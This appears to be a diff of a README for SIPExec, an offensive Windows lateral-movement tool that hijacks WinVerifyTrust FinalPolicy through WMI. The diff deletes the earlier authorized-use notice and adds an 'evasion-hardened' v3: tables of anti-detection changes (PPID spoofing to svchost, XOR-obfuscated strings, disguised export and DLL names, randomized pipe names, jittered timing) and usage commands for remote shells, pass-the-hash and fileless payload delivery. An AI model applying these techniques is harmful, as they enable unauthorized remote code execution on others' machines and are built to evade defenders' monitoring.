@@ -1,55 +1,61 @@
-# SIPExec
+# SIPExec v3 — Experimental (Evasion-Hardened)
 
-Remote command execution through WinVerifyTrust FinalPolicy hijacking.
-SIPExec stages a payload DLL, updates the target's trust-provider registry
-configuration through WMI, triggers a fresh WMI provider load, and communicates
-with the payload over `\\target\pipe\sipexec`.
+Lateral movement via WinVerifyTrust FinalPolicy hijack with reduced detection surface.
 
-Use only on systems you own or are authorized to test.
+## Changes from v2
 
-## Requirements
-
-- Python 3
-- `impacket`
-- Administrative access to the Windows target
-- SMB and DCOM/WMI connectivity
-
-```bash
-python3 -m pip install impacket
-```
+| Area | v2 | v3 |
+|------|----|----|
+| wmiprvse refresh | Kill all instances (Sysmon 5, WMI errors) | Query fresh namespace (no kill) |
+| Registry dwell | Entire session lifetime | <2s atomic window |
+| Pipe name | Static `\\pipe\sipexec` | Derived from DLL path hash (`wkssvc_<hash>`) |
+| Trust provider GUID | Authenticode only (most monitored) | Selectable: default, driver, https |
+| Payload export | `SipExecFinalPolicy` | `WTHelperCertCheckValidSignature` |
+| IOC strings | Plaintext | XOR-obfuscated |
+| PE internal name | `sipexec_payload.dll` | `wtsvc.dll` |
+| Child process | `wmiprvse → cmd.exe` | PPID-spoofed to svchost.exe |
+| Timing | Fixed sleeps | Jittered ±30% |
 
 ## Usage
 
 ```bash
-# Upload the bundled payload, run one command, then clean up
-python3 sipexec.py 'DOMAIN/user:password@target' whoami
-
-# Interactive shell
+# Interactive shell (default GUID)
 python3 sipexec.py 'DOMAIN/user:password@target'
 
-# Pass the hash
-python3 sipexec.py -hashes :NTHASH 'DOMAIN/user@target' whoami
+# Single command, driver GUID (less monitored)
+python3 sipexec.py -guid driver 'user:pass@target' "whoami /all"
 
-# Serve the payload over SMB instead of writing it to the target
-sudo python3 sipexec.py -serve -listen 192.0.2.10 \
-  'DOMAIN/user:password@target' whoami
+# Fileless via UNC
+sudo python3 sipexec.py -serve -listen 10.0.0.5 'user:pass@target'
 
-# Use a payload already accessible to the target
-python3 sipexec.py -dll 'C:\Windows\Temp\sipexec_payload.dll' \
-  'DOMAIN/user:password@target' whoami
+# With SIP hijack (DLL appears signed)
+python3 sipexec.py -sig-hijack -guid https 'user:pass@target'
+
+# PTH
+python3 sipexec.py -hashes :NTHASH 'user@target' "net user"
 ```
 
-Run `python3 sipexec.py -h` for all authentication and delivery options.
-
-## Build
-
-The repository includes the ready-to-use signed payload. To rebuild an unsigned
-payload from source:
+## Build Payload
 
 ```bash
-x86_64-w64-mingw32-gcc -shared -O2 -Wall \
-  -o sipexec_payload.dll sipexec_payload.c
+x86_64-w64-mingw32-gcc -shared -O2 -s -fno-ident \
+  -o sipexec_payload.dll sipexec_payload.c payload.def -lkernel32
 ```
 
-The orchestrator prefers `sipexec_payload_signed.dll` when present and otherwise
-uses `sipexec_payload.dll`.
+## Detection Surface (reduced)
+
+| Signal | Status |
+|--------|--------|
+| wmiprvse terminated | ✅ Eliminated |
+| FinalPolicy registry modified | ⚠️ Still fires, but <2s window |
+| Static pipe name IOC | ✅ Eliminated (randomized) |
+| cmd.exe child of wmiprvse | ⚠️ Still present but PPID-spoofed |
+| DLL export name IOC | ✅ Eliminated |
+| Payload strings | ✅ Obfuscated |
+
+## Files
+
+- `sipexec.py` — Python orchestrator
+- `sipexec_payload.c` — Payload source
+- `payload.def` — PE module definition (controls internal DLL name)
+- `sipexec_payload.dll` — Built payload (unsigned)
